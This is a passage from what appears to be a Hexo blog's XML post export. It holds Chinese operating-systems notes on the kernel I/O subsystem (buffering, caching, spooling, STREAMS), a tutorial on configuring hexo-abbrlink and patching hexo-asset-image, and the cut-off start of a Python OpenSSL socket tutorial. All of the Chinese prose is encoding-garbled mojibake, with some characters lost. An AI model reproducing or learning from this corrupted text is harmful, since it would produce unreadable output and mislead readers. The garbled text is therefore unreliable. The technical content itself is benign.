è¾“åº”å®Œæ•´åœ°æ‰§è¡Œï¼Œå…¶å…·ä½“æ‰§è¡Œå¯ä»¥æ˜¯å°†æ¥æŸä¸ªç‰¹å®šæ—¶é—´ã€‚</li></ul></li></ul><p>1.åŒæ­¥ä¸å¼‚æ­¥</p><ul><li><p>åŒæ­¥å’Œå¼‚æ­¥å…³æ³¨çš„æ˜¯æ¶ˆæ¯é€šä¿¡æœºåˆ¶</p></li><li><p>åŒæ­¥ï¼Œå°±æ˜¯åœ¨å‘å‡ºä¸€ä¸ªè°ƒç”¨æ—¶ï¼Œåœ¨æ²¡æœ‰å¾—åˆ°ç»“æœä¹‹å‰ï¼Œè¯¥è°ƒç”¨å°±ä¸è¿”å›ã€‚ä½†æ˜¯ä¸€æ—¦è°ƒç”¨è¿”å›ï¼Œå°±å¾—åˆ°è¿”å›å€¼äº†</p></li><li><p>å¼‚æ­¥åˆ™æ˜¯ç›¸åï¼Œè°ƒç”¨åœ¨å‘å‡ºä¹‹åï¼Œè¿™ä¸ªè°ƒç”¨å°±ç›´æ¥è¿”å›äº†ï¼Œæ‰€ä»¥æ²¡æœ‰è¿”å›ç»“æœ</p></li></ul><p>2.é˜»å¡ä¸éé˜»å¡</p><ul><li>é˜»å¡å’Œéé˜»å¡å…³æ³¨çš„æ˜¯ç¨‹åºåœ¨ç­‰å¾…è°ƒç”¨ç»“æœï¼ˆæ¶ˆæ¯ï¼Œè¿”å›å€¼ï¼‰æ—¶çš„çŠ¶æ€.</li><li>é˜»å¡è°ƒç”¨æ˜¯æŒ‡è°ƒç”¨ç»“æœè¿”å›ä¹‹å‰ï¼Œå½“å‰çº¿ç¨‹ä¼šè¢«æŒ‚èµ·ã€‚è°ƒç”¨çº¿ç¨‹åªæœ‰åœ¨å¾—åˆ°ç»“æœä¹‹åæ‰ä¼šè¿”å›ã€‚</li><li>éé˜»å¡è°ƒç”¨æŒ‡åœ¨ä¸èƒ½ç«‹åˆ»å¾—åˆ°ç»“æœä¹‹å‰ï¼Œè¯¥è°ƒç”¨ä¸ä¼šé˜»å¡å½“å‰çº¿ç¨‹ã€‚</li></ul><h2 id="134-ioå†…æ ¸å­ç³»ç»Ÿ"><a class="markdownIt-Anchor" href="#134-ioå†…æ ¸å­ç³»ç»Ÿ"></a> 13.4 I/Oå†…æ ¸å­ç³»ç»Ÿ</h2><ul><li><p>I/Oè®¾å¤‡ç§ç±»ç¹å¤šï¼ŒåŠŸèƒ½å’Œä¼ è¾“é€Ÿç‡å·®å¼‚å·¨å¤§ï¼Œéœ€è¦å¤šç§æ–¹æ³•æ¥è¿›è¡Œè®¾å¤‡æ§åˆ¶ã€‚è¿™äº›æ–¹æ³•å…±åŒç»„æˆäº†æ“ä½œç³»ç»Ÿå†…æ ¸çš„I/Oå­ç³»ç»Ÿï¼Œå®ƒå°†å†…æ ¸çš„å…¶ä»–æ–¹é¢ä»ç¹é‡çš„I/Oè®¾å¤‡ç®¡ç†ä¸­è§£æ”¾å‡ºæ¥ã€‚</p></li><li><p>I/Oæ ¸å¿ƒå­ç³»ç»Ÿæä¾›çš„æœåŠ¡ä¸»è¦æœ‰I/Oè°ƒåº¦ã€ç¼“å†²ä¸é«˜é€Ÿç¼“å­˜ã€è®¾å¤‡åˆ†é…ä¸å›æ”¶ã€å‡è„±æœºã€è®¾å¤‡ä¿æŠ¤å’Œå·®é”™å¤„ç†ç­‰</p></li></ul><h3 id="1341-ioè°ƒåº¦"><a class="markdownIt-Anchor" href="#1341-ioè°ƒåº¦"></a> 13.4.1 I/Oè°ƒåº¦</h3><ul><li><p>è°ƒåº¦ä¸€ç»„I/Oè¯·æ±‚å°±æ˜¯ç¡®å®šä¸€ä¸ªå¥½çš„é¡ºåºæ¥æ‰§è¡Œè¿™äº›è¯·æ±‚ã€‚</p><ul><li>å‡è®¾ç£å¤´ä½äºç£ç›˜å¼€å§‹å¤„ï¼Œä¸‰ä¸ªåº”ç”¨ç¨‹åºå‘è¯¥ç£ç›˜å‘å¸ƒé˜»å¡è¯»è°ƒç”¨ã€‚åº”ç”¨ç¨‹åº1éœ€è¦ç£ç›˜ç»“æŸéƒ¨åˆ†çš„å—ï¼Œåº”ç”¨ç¨‹åº2éœ€è¦ç£ç›˜å¼€å§‹éƒ¨åˆ†çš„å—ï¼Œåº”ç”¨ç¨‹åº3éœ€è¦ç£ç›˜ä¸­é—´éƒ¨åˆ†çš„å—ã€‚OSå¦‚æœæŒ‰2ã€3ã€1çš„é¡ºåºå¤„ç†ï¼Œåˆ™å¯ä»¥å‡ä½ç£å¤´æ‰€éœ€ç§»åŠ¨çš„è·ç¦»ã€‚æŒ‰è¿™ç§æ–¹æ³•æ¥é‡æ–°å®‰æ’æœåŠ¡é¡ºåºå°±æ˜¯I/Oè°ƒåº¦çš„æ ¸å¿ƒã€‚</li><li>é‡æ–°å®‰æ’é˜Ÿåˆ—é¡ºåºä»¥æ”¹å–„æ€»ä½“æ•ˆç‡å’Œå¹³å‡å“åº”æ—¶é—´</li></ul></li><li><p>å®ç°</p><ul><li>OSé€šè¿‡ä¸ºæ¯ä¸ªè®¾å¤‡ç»´æŠ¤ä¸€ä¸ªè¯·æ±‚é˜Ÿåˆ—æ¥å®ç°è°ƒåº¦ã€‚</li><li>å¯ä»¥è¯•å›¾å…¬å¹³ï¼Œä¹Ÿå¯ä»¥æ ¹æ®ä¸åŒçš„ä¼˜å…ˆçº§è¿›è¡ŒI/Oè°ƒåº¦ã€‚</li><li>å…¶ä»–æ–¹æ³•ï¼šç¼“å†²ã€é«˜é€Ÿç¼“å†²ã€å‡è„±æœº</li></ul></li></ul><h3 id="1342-ç¼“å†²"><a class="markdownIt-Anchor" href="#1342-ç¼“å†²"></a> 13.4.2 ç¼“å†²</h3><p>é‡‡ç”¨ç¼“å†²æœ‰ä¸‰ä¸ªç†ç”±ã€‚</p><ul><li>ä¸€ä¸ªç†ç”±æ˜¯å¤„ç†æ•°æ®æµçš„ç”Ÿäº§è€…ä¸æ¶ˆè´¹è€…ä¹‹é—´çš„é€Ÿåº¦å·®å¼‚</li><li>åè°ƒä¼ è¾“æ•°æ®å¤§å°ä¸ä¸€è‡´çš„è®¾å¤‡</li><li>æ”¯æŒåº”ç”¨ç¨‹åºI/Oçš„å¤åˆ¶è¯­ä¹‰</li></ul><p>åœ¨è®¾å¤‡ç®¡ç†å­ç³»ç»Ÿä¸­ï¼Œå¼•å…¥ç¼“å†²åŒºçš„ç›®çš„ä¸»è¦æœ‰ï¼šï¼ˆè§£å†³é€Ÿåº¦æ…¢å’Œå¿«çš„äº¤æ¥é—®é¢˜ï¼Œä¸€èˆ¬ä¸éœ€è¦æ”¯æŒéšæœºè¯»å†™ï¼‰</p><ul><li><p>ç¼“å’ŒCPUä¸I/Oè®¾å¤‡é—´é€Ÿåº¦ä¸åŒ¹é…çš„çŸ›ç›¾ã€‚</p></li><li><p>å‡å°‘å¯¹CPUçš„ä¸­æ–­é¢‘ç‡ï¼Œæ”¾å®½å¯¹CPUä¸­æ–­å“åº”æ—¶é—´çš„é™åˆ¶ã€‚</p></li><li><p>è§£å†³åŸºæœ¬æ•°æ®å•å…ƒå¤§å°ï¼ˆå³æ•°æ®ç²’åº¦ï¼‰ä¸åŒ¹é…çš„é—®é¢˜ã€‚</p></li><li><p>æé«˜CPUå’ŒI/Oè®¾å¤‡ä¹‹é—´çš„å¹¶è¡Œæ€§ã€‚</p></li><li><p>å®ç°æ–¹æ³•æœ‰ï¼š</p><ul><li>é‡†ç”¨ç¡¬ä»¶ç¼“å†²å™¨ï¼Œä½†ç”±äºæˆæœ¬å¤ªé«˜ï¼Œé™¤ä¸€äº›å…³é”®éƒ¨ä½å¤–ï¼Œä¸€èˆ¬ä¸é‡†ç”¨ç¡¬ä»¶ç¼“å†²å™¨</li><li>é‡†ç”¨ç¼“å†²åŒºï¼ˆä½äºå†…å­˜åŒºåŸŸï¼‰ã€‚</li></ul></li></ul><h3 id="1343-é«˜é€Ÿç¼“å­˜"><a class="markdownIt-Anchor" href="#1343-é«˜é€Ÿç¼“å­˜"></a> 13.4.3 é«˜é€Ÿç¼“å­˜</h3><p>é«˜é€Ÿç¼“å­˜ï¼ˆ cache ï¼‰æ˜¯å¯ä»¥ä¿ç•™æ•°æ®å‰¯æœ¬çš„é«˜é€Ÿå­˜å‚¨å™¨ã€‚ é«˜é€Ÿç¼“å†²åŒºå‰¯æœ¬çš„è®¿é—®è¦æ¯”åŸå§‹æ•°æ®è®¿é—®è¦æ›´ä¸ºé«˜æ•ˆã€‚</p><ul><li>ç£ç›˜é«˜é€Ÿç¼“å­˜(Disk Cache)ï¼ˆä¸»è¦ç”¨äºå®ç°æ•°æ®çš„é‡å¤ä½¿ç”¨ï¼Œæ”¯æŒéšæœºè¯»å†™ï¼‰</li><li>æ“ä½œç³»ç»Ÿä¸­ä½¿ç”¨ç£ç›˜é«˜é€Ÿç¼“å­˜æŠ€æœ¯æ¥æé«˜ç£ç›˜çš„I/Oé€Ÿåº¦ï¼Œå¯¹é«˜é€Ÿç¼“å­˜å¤åˆ¶çš„è®¿é—®è¦æ¯”åŸå§‹æ•°æ®è®¿é—®æ›´ä¸ºé«˜æ•ˆã€‚ä¾‹å¦‚ï¼Œæ­£åœ¨è¿è¡Œçš„è¿›ç¨‹çš„æŒ‡ä»¤æ—¢å­˜å‚¨åœ¨ç£ç›˜ä¸Šï¼Œä¹Ÿå­˜å‚¨åœ¨ç‰©ç†å†…å­˜ä¸Šï¼Œä¹Ÿè¢«å¤åˆ¶åˆ°CPUçš„äºŒçº§å’Œä¸€çº§é«˜é€Ÿç¼“å­˜ä¸­ã€‚</li><li>ç£ç›˜é«˜é€Ÿç¼“å­˜æ˜¯æŒ‡åˆ©ç”¨å†…å­˜ä¸­çš„å­˜å‚¨ç©ºé—´æ¥æš‚å­˜ä»ç£ç›˜ä¸­è¯»å‡ºçš„ä¸€ç³»åˆ—ç›˜å—ä¸­çš„ä¿¡æ¯ã€‚å› æ­¤ï¼Œç£ç›˜é«˜é€Ÿç¼“å­˜åœ¨é€»è¾‘ä¸Šå±äºç£ç›˜ï¼Œç‰©ç†ä¸Šåˆ™æ˜¯é©»ç•™åœ¨å†…å­˜ä¸­çš„ç›˜å—ã€‚</li><li>é«˜é€Ÿç¼“å­˜åœ¨å†…å­˜ä¸­åˆ†ä¸ºä¸¤ç§å½¢å¼ï¼š<ul><li>ä¸€ç§æ˜¯åœ¨å†…å­˜ä¸­å¼€è¾Ÿä¸€ä¸ªå•ç‹¬çš„å­˜å‚¨ç©ºé—´ä½œä¸ºç£é€Ÿç¼“å­˜ï¼Œå¤§å°å›ºå®šï¼›</li><li>å¦ä¸€ç§æ˜¯æŠŠæœªåˆ©ç”¨çš„å†…å­˜ç©ºé—´ä½œä¸ºä¸€ä¸ªç¼“æ²–æ± ï¼Œä¾›è¯·æ±‚åˆ†é¡µç³»ç»Ÿå’Œç£ç›˜I/Oæ—¶å…±äº«ã€‚</li></ul></li></ul><h3 id="1344-å‡è„±æœºä¸è®¾å¤‡é¢„ç•™"><a class="markdownIt-Anchor" href="#1344-å‡è„±æœºä¸è®¾å¤‡é¢„ç•™"></a> 13.4.4 å‡è„±æœºä¸è®¾å¤‡é¢„ç•™</h3><p>å‡è„±æœºï¼ˆspoolï¼‰ ï¼ä¸ºäº†ç¼“å’ŒCPUçš„é«˜é€Ÿæ€§ä¸I/Oè®¾å¤‡ä½é€Ÿæ€§ä¹‹é—´çš„çŸ›ç›¾è€Œå¼•å…¥äº†è„±æœºè¾“å…¥/è¾“å‡ºæŠ€æœ¯ã€‚è¯¥æŠ€æœ¯æ˜¯åˆ©ç”¨ä¸“é—¨çš„å¤–å›´æ§åˆ¶æœºï¼Œå°†ä½é€ŸI/Oè®¾å¤‡ä¸Šçš„æ•°æ®ä¼ é€åˆ°é«˜é€Ÿç£ç›˜ä¸Šï¼›æˆ–è€…ç›¸åã€‚ SPOOLingçš„æ„æ€æ˜¯å¤–éƒ¨è®¾å¤‡åŒæ—¶è”æœºæ“ä½œï¼Œåˆç§°ä¸ºå‡è„±æœºè¾“å…¥/è¾“å‡ºæ“ä½œï¼Œæ˜¯æ“ä½œç³»ç»Ÿä¸­é‡†ç”¨çš„ä¸€é¡¹å°†ç‹¬å è®¾å¤‡æ”¹é€ æˆå…±äº«è®¾å¤‡çš„æŠ€æœ¯ã€‚</p><h3 id="1345-é”™è¯¯å¤„ç†"><a class="markdownIt-Anchor" href="#1345-é”™è¯¯å¤„ç†"></a> 13.4.5 é”™è¯¯å¤„ç†</h3><ul><li>OSå¯ä»¥å¯¹çŸ­æš‚å‡ºé”™è¿›è¡Œå¼¥è¡¥ã€‚<ul><li>ä¾‹å¦‚ï¼šç£ç›˜readå‡ºé”™å¯ä»¥å¯¼è‡´readé‡è¯•ï¼Œç½‘ç»œsendå‡ºé”™å¯ä»¥å¯¼è‡´resendï¼ˆå¦‚æœåè®®å…è®¸ï¼‰ã€‚ä½†æ˜¯å¦‚æœæŸä¸ªé‡è¦ç³»ç»Ÿç»„ä»¶å‡ºç°äº†æ°¸ä¹…é”™è¯¯ï¼Œé‚£ä¹ˆOSå°±ä¸å¯èƒ½ä»ä¸­æ¢å¤ã€‚</li></ul></li><li>å½“I/Oè¯·æ±‚å¤±è´¥åï¼Œå¤šæ•°è¿”å›ä¸€ä¸ªé”™è¯¯å·æˆ–é”™è¯¯ç </li><li>ç³»ç»Ÿé”™è¯¯æ—¥å¿—ä¿å­˜é—®é¢˜çš„è¯¦ç»†æŠ¥å‘Š</li></ul><h3 id="1346-ioä¿æŠ¤"><a class="markdownIt-Anchor" href="#1346-ioä¿æŠ¤"></a> 13.4.6 I/Oä¿æŠ¤</h3><h3 id="1347-å†…æ ¸æ•°æ®ç»“æ„"><a class="markdownIt-Anchor" href="#1347-å†…æ ¸æ•°æ®ç»“æ„"></a> 13.4.7 å†…æ ¸æ•°æ®ç»“æ„</h3><ul><li>å†…æ ¸éœ€è¦ä¿å­˜ç•™I/Oç»„ä»¶ä½¿ç”¨çš„çŠ¶æ€ä¿¡æ¯ï¼ŒåŒ…æ‹¬æ‰“å¼€æ–‡ä»¶è¡¨ï¼Œç½‘ç»œè¿æ¥ï¼Œå­—ç¬¦è®¾å¤‡çŠ¶æ€ç­‰</li><li>è®¸å¤šå¤æ‚çš„æ•°æ®ç»“æ„ç”¨æ¥è·Ÿè¸ªç¼“å†²ï¼Œå†…å­˜åˆ†é…ï¼ŒåŠâ€œè„â€å—</li><li>æŸäº›OSç”¨é¢å‘å¯¹è±¡çš„æ–¹æ³•å’Œæ¶ˆæ¯ä¼ é€’çš„æ–¹æ³•æ¥å®ç°I/O</li></ul><h3 id="1348-å†…æ ¸ioå­ç³»ç»Ÿå°ç»“"><a class="markdownIt-Anchor" href="#1348-å†…æ ¸ioå­ç³»ç»Ÿå°ç»“"></a> 13.4.8 å†…æ ¸I/Oå­ç³»ç»Ÿå°ç»“</h3><h2 id="135-æŠŠioæ“ä½œè½¬æ¢æˆç¡¬ä»¶æ“ä½œ"><a class="markdownIt-Anchor" href="#135-æŠŠioæ“ä½œè½¬æ¢æˆç¡¬ä»¶æ“ä½œ"></a> 13.5 æŠŠI/Oæ“ä½œè½¬æ¢æˆç¡¬ä»¶æ“ä½œ</h2><ul><li>ä»ç£ç›˜è¯»æ–‡ä»¶åˆ°è¿›ç¨‹çš„è¿‡ç¨‹<ul><li>æ‰¾åˆ°åŒ…å«æ–‡ä»¶çš„è®¾å¤‡</li><li>å°†æ–‡ä»¶åè½¬æ¢æˆè®¾å¤‡å®ç°</li><li>ä»ç£ç›˜ä¸Šè¯»æ•°æ®è‡³ç¼“å†²åŒº</li><li>é€šçŸ¥è¿›ç¨‹æ•°æ®å¯ç”¨</li><li>å°†æ§åˆ¶è¿”å›ç»™è¿›ç¨‹</li></ul></li></ul><h2 id="136-æµ"><a class="markdownIt-Anchor" href="#136-æµ"></a> 13.6 æµ</h2><ul><li>STREAM ï¼ ç”¨æˆ·çº§è¿›ç¨‹ä¸è®¾å¤‡ä¹‹é—´å®Œå…¨åŒæ–¹çš„é€šä¿¡é€šé“</li><li>STREAMåŒ…æ‹¬<ul><li>STREAMè‡³ç”¨æˆ·è¿›ç¨‹çš„æ¥å£</li><li>é©±åŠ¨å™¨è‡³è®¾å¤‡çš„æ¥å£</li><li>ä¸¤è€…ä¹‹é—´é›¶æˆ–å¤šä¸ªSTREAMæ¨¡å—</li></ul></li><li>æ¯ä¸ªæ¨¡å—åŒ…å«ä¸€ä¸ªè¯»é˜Ÿåˆ—å’Œä¸€ä¸ªå†™é˜Ÿåˆ—</li><li>é˜Ÿåˆ—ä¹‹é—´é€šè¿‡æ¶ˆæ¯ä¼ é€’è¿›è¡Œé€šä¿¡</li></ul><h2 id="137-æ€§èƒ½"><a class="markdownIt-Anchor" href="#137-æ€§èƒ½"></a> 13.7 æ€§èƒ½</h2><p>I/Oæ˜¯å½±å“ç³»ç»Ÿæ€§èƒ½çš„é‡è¦å› ç´ ä¹‹ä¸€</p><ul><li>æ‰§è¡Œè®¾å¤‡é©±åŠ¨ç¨‹åºä»£ç ä»¥åŠéšç€è¿›ç¨‹é˜»å¡å˜åŒ–è€Œå…¬å¹³ä¸”é«˜æ•ˆåœ°è°ƒåº¦è¿›ç¨‹éƒ½å¢åŠ äº†CPUçš„è´Ÿè·ã€‚</li><li>ç”±äºä¸­æ–­è€Œäº§ç”Ÿçš„ä¸Šä¸‹æ–‡åˆ‡æ¢ä¹Ÿå¢åŠ äº†CPUåŠå…¶ç¡¬ä»¶é«˜é€Ÿç¼“å­˜çš„è´Ÿæ‹…ã€‚</li><li>ç”¨äºæ§åˆ¶å™¨å’Œç‰©ç†å†…å­˜ä¹‹é—´çš„æ•°æ®æ‹·è´ä»¥åŠå†…æ ¸ç¼“å†²å’Œåº”ç”¨ç¨‹åºæ•°æ®ç©ºé—´ä¹‹é—´æœ‰æ•°æ®æ‹·è´æ—¶çš„å†…å­˜æ€»çº¿çš„è´Ÿè·è¿‡é‡ã€‚</li><li>ç½‘ç»œäº¤é€šä¹Ÿèƒ½å¯¼è‡´æ›´é«˜çš„å…³è”åˆ‡æ¢ç‡ã€‚</li></ul><p><strong>æé«˜æ€§èƒ½ï¼š</strong></p><ul><li>å‡å°‘ä¸Šä¸‹æ–‡åˆ‡æ¢ï¼ˆcontext switchï¼‰çš„æ¬¡æ•°</li><li>å‡å°‘è®¾å¤‡å’Œåº”ç”¨ç¨‹åºä¹‹é—´ä¼ é€’æ•°æ®æ—¶åœ¨å†…å­˜ä¸­çš„æ•°æ®æ‹·è´æ¬¡æ•°<br>ä½¿ç”¨å¤§ä¼ è¾“ã€æ™ºèƒ½æ§åˆ¶å™¨åŠè½®æµæ£€æµ‹æ¥å‡å°‘ä¸­æ–­é¢‘ç‡ã€‚</li><li>é€šè¿‡é‡‡ç”¨DMAæ™ºèƒ½æ§åˆ¶å™¨å’Œé€šé“æ¥ä¸ºä¸»CPUæ‰¿æ‹…ç®€å•æ•°æ®æ‹·è´ï¼Œä»¥å¢åŠ å¹¶å‘ã€‚</li><li>å°†å¤„ç†åŸè¯­ç§»å…¥ç¡¬ä»¶ï¼Œå…è®¸æ§åˆ¶å™¨å†…çš„æ“ä½œä¸CPUå’Œæ€»çº¿å†…çš„æ“ä½œå¹¶å‘ã€‚</li><li>å¹³è¡¡CPUï¼Œå†…å­˜å­ç³»ç»Ÿï¼Œæ€»çº¿å’ŒI/Oçš„æ€§èƒ½ï¼Œå› ä¸ºä»»ä½•ä¸€å¤„çš„è¿‡è½½éƒ½ä¼šå¼•èµ·å…¶ä»–éƒ¨åˆ†ç©ºé—²ã€‚</li></ul><h2 id="138-å°ç»“"><a class="markdownIt-Anchor" href="#138-å°ç»“"></a> 13.8 å°ç»“</h2><h3 id="ä¹ é¢˜-4"><a class="markdownIt-Anchor" href="#ä¹ é¢˜-4"></a> ä¹ é¢˜</h3>]]></content>
    
    
    <categories>
      
      <category>æ“ä½œç³»ç»Ÿ</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ“ä½œç³»ç»Ÿ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ä½¿ç”¨hexo-abbrlinkåŠè§£å†³ä¸hexo-asset-imageä¸é€‚é…çš„é—®é¢˜</title>
    <link href="/posts/7e71e806/"/>
    <url>/posts/7e71e806/</url>
    
    <content type="html"><![CDATA[<p>æ’ä»¶åŠŸèƒ½ï¼š</p><p>å…¨è‡ªåŠ¨ç”ŸæˆæƒŸä¸€çš„ä¸å¸¦ä¸­æ–‡çš„åšå®¢é“¾æ¥</p><p>åŸç†ï¼š</p><p>å¯¹<code>æ ‡é¢˜</code>+<code>æ—¶é—´</code>è¿›è¡Œ<code>md5</code>è€Œåå†è½¬<code>base64</code>ï¼Œä¿å­˜åœ¨<code>front-matter</code>ä¸­ã€‚</p><p>å®‰è£…ï¼š</p><figure class="highlight ada"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ada">npm install hexo-abbrlink <span class="hljs-comment">--save</span><br></code></pre></div></td></tr></table></figure><p>é…ç½®åšå®¢ç«™ç‚¹é…ç½®æ–‡ä»¶_config.ymlï¼š</p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts"><span class="hljs-symbol">permalink:</span> posts/:abbrlink/<br><span class="hljs-meta"># abbrlink config</span><br><span class="hljs-symbol">abbrlink:</span><br><span class="hljs-symbol">  alg:</span> crc32  <span class="hljs-meta">#support crc16(default) and crc32</span><br><span class="hljs-symbol">  rep:</span> hex    <span class="hljs-meta">#support dec(default) and hex</span><br></code></pre></div></td></tr></table></figure><p>æµ‹è¯•ï¼š</p><figure class="highlight ebnf"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ebnf"><span class="hljs-attribute">hexo clean</span><br><span class="hljs-attribute">hexo g</span><br><span class="hljs-attribute">hexo s</span><br></code></pre></div></td></tr></table></figure><p>é—®é¢˜ï¼š</p><p>é“¾æ¥æ˜¯ä¿®æ”¹äº†ï¼Œä½†æ˜¯å›¾ç‰‡ä¸èƒ½æˆåŠŸæ˜¾ç¤º</p><p>åæ¥å‘ç°æ˜¯ä¸hexo-asset-imageä¸èƒ½é€‚é…çš„é—®é¢˜ï¼Œhexo-abbrlinkä½¿ç”¨åå¯¼è‡´å›¾ç‰‡è·¯å¾„å˜åŒ–ï¼Œæ‰€ä»¥ä¸èƒ½æˆåŠŸè¯†åˆ«å›¾ç‰‡ï¼Œæ‰€ä»¥éœ€è¦ä¿®æ”¹ä¸‹é¢çš„æ–‡ä»¶</p><p>\node_modules\hexo-asset-image\index.js<br>1ã€åœ¨æºç çš„12è¡Œé™„è¿‘<code>var link = data.permalink;</code>è¿™ä¸€è¡Œçš„ä¸‹é¢ï¼Œ<strong>æ·»åŠ </strong> ä¸€è¡Œ<code>var abbrlink = data.abbrlink</code><br>ï¼ˆæ„æ€æ˜¯å®šä¹‰ä¸€ä¸ªå˜é‡abbrlinkï¼‰<br>2ã€åœ¨44è¡Œé™„è¿‘ï¼Œæºç çš„<code>$(this).attr('src', config.root + link + src);</code>è¿™ä¸€è¡Œï¼Œ<strong>ä¿®æ”¹</strong> ä¸ºä¸‹é¢ä¸€è¡Œï¼š<br><code>$(this).attr('src', config.root + 'posts/' + abbrlink + '/' + src); //é€‚é…abbrlink</code><br>ï¼ˆæ„æ€æ˜¯ç”Ÿæˆçš„å›¾ç‰‡é“¾æ¥ä¸­ï¼Œæ‹¼æ¥abbrlinkï¼‰</p><p>ç„¶åé‡æ–°hexo clean å’Œ hexo gï¼Œå³å¯ç”Ÿæ•ˆã€‚<br>_postsæ–‡ä»¶å¤¹ä¸‹çš„æ–‡ç« ï¼ŒæŒ‰ç…§è‡ªå·±å–œæ¬¢çš„æ–¹å¼æ•´ç†ï¼Œç”Ÿæˆçš„é“¾æ¥æ˜¯æ­£å¸¸çš„ï¼Œåœ¨typoraä¸­å¯ä»¥æ­£å¸¸æ˜¾ç¤ºã€‚</p><p>å‚è€ƒé“¾æ¥ï¼š</p><p><a href="https://github.com/rozbo/hexo-abbrlink/issues/19">https://github.com/rozbo/hexo-abbrlink/issues/19</a></p><p><a href="https://www.shangmayuan.com/a/8863defeb3264ffd84335151.html">https://www.shangmayuan.com/a/8863defeb3264ffd84335151.html</a></p>]]></content>
    
    
    <categories>
      
      <category>hexo</category>
      
    </categories>
    
    
    <tags>
      
      <tag>hexo</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>åˆ©ç”¨OpenSSLè¿›è¡ŒSSLé€šä¿¡çš„pythonå®ç°</title>
    <link href="/posts/cf547d62/"/>
    <url>/posts/cf547d62/</url>
    
    <content type="html"><![CDATA[<h1 id="opensslå®‰è£…"><a class="markdownIt-Anchor" href="#opensslå®‰è£…"></a> OpenSSLå®‰è£…</h1><p>åˆ©ç”¨ç¬¬ä¸‰æ–¹æä¾›çš„<a href="http://slproweb.com/products/Win32OpenSSL.html">å¼€æºå·¥å…·</a>ç›´æ¥æ— è„‘å®‰è£…</p><p>ç›´æ¥æŒ‰ç…§æ™®é€šçš„windowsç¨‹åºnextï¼Œnextçš„å®‰è£…å°±è¡Œäº†ã€‚</p><p>æœ€åæˆ‘ä»¬åœ¨ç¯å¢ƒå˜é‡ä¸­ï¼Œå°†binæ–‡ä»¶å¤¹é…ç½®èµ·æ¥ï¼Œå°±å¯ä»¥åœ¨å‘½ä»¤è¡Œä¸­è°ƒç”¨OpenSSLäº†ã€‚å¦‚æœæš‚æ—¶æ²¡æˆåŠŸçš„è¯å°±é‡å¯ä¸€ä¸‹ç”µè„‘è®©é…ç½®ç”Ÿæ•ˆã€‚</p><p><img src="/posts/cf547d62/image-20211229172206022.png" alt="image-20211229172206022"></p><p><img src="/posts/cf547d62/image-20211230110019576.png" alt="image-20211230110019576"></p><h1 id="ssl-socketé€šä¿¡æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯"><a class="markdownIt-Anchor" href="#ssl-socketé€šä¿¡æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯"></a> SSL socketé€šä¿¡(æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯)</h1><blockquote><p>å¯¹ä¸‹æ–¹å‡½æ•°å’Œå‘½ä»¤ä¸äº†è§£å¯å…ˆå‚è€ƒ<a href="#%E9%99%84%E5%BD%95">é™„å½•</a>éƒ¨åˆ†</p></blockquote><h2 id="sslé€šä¿¡åŸç†"><a class="markdownIt-Anchor" href="#sslé€šä¿¡åŸç†"></a> SSLé€šä¿¡åŸç†</h2><p><img src="/posts/cf547d62/bVbClUj.png" alt="HTTPå’ŒHTTPSçš„å…³ç³»"></p><p>SSLé€šä¿¡çš„æœ¬è´¨æ˜¯å•¥ï¼Ÿæœ¬è´¨å°±æ˜¯å®¢æˆ·ç«¯æ‹¿ç€è®¤è¯æœºå…³çš„è¯ä¹¦å»è®¤è¯å¯¹æ–¹ç½‘ç«™åˆ°åº•æ˜¯ä¸æ˜¯ä½ è¦è®¿é—®çš„ã€‚</p><p>å› ä¸ºæœ‰äººä¼šå†™ä¸€ä¸ªå‡çš„ç½‘ç«™éª—å–æµé‡ï¼ˆåŠæµé‡åŠ«æŒï¼‰ã€‚å¦‚æœä¸€æ—¦åœ¨è¿™ä¸ªå‡çš„ç½‘ç«™ä¸Šè¾“å…¥äº†ç”¨æˆ·åå¯†ç ä¹‹åå°±å­˜åœ¨ç€ä¿¡æ¯æ»¥ç”¨çš„é£é™©ã€‚</p><p>ä¸ºäº†é¿å…è¿™æ ·çš„æƒ…å†µï¼Œæ‰€ä»¥æ‰æœ‰SSLè¿™ä¸ªå·¥å…·ã€‚</p><ul><li><p>å®¢æˆ·ç«¯ä»¥åæ¯æ¬¡è®¿é—®ä¸€ä¸ªé‡è¦çš„ç½‘ç«™æ—¶å°±è¦æ‹¿ç€å‘è¯æœºå…³CAï¼ˆCerficate Authorityï¼‰çš„è¯ä¹¦å’Œå¯¹æ–¹è¿æ¥çš„æ—¶å€™éªŒè¯ä¸€ä¸‹ã€‚å’‹éªŒè¯çš„å‘¢ï¼Ÿå®¢æˆ·ç«¯è¿æ¥çš„æ—¶å€™æœåŠ¡ç«¯ä¹Ÿæœ‰è¯ä¹¦ï¼Œè¿™ä¸ªè¯ä¹¦ä¹Ÿæ˜¯CAå‘ç»™ä»–ä»¬çš„ï¼Œé‡Œé¢çš„å†…å®¹è¿›è¡Œäº†åŠ å¯†ï¼Œåªè¦æ‹¿CAå‘ç»™å®¢æˆ·çš„é‚£ä¸ªè¯ä¹¦å¯¹æ¥ä¸€äº›å°±çŸ¥é“å¯¹é¢ç½‘ç«™çš„é‚£ä¸ªè¯ä¹¦æ˜¯ä¸æ˜¯çœŸçš„ã€‚è¿™å°±æ˜¯SSLçš„åŸºæœ¬é€»è¾‘ã€‚</p></li><li><p>åŒæ—¶é€šä¿¡çš„è¿‡ç¨‹ä¹Ÿæ˜¯åŠ å¯†äº†çš„ï¼Œè¿™æ 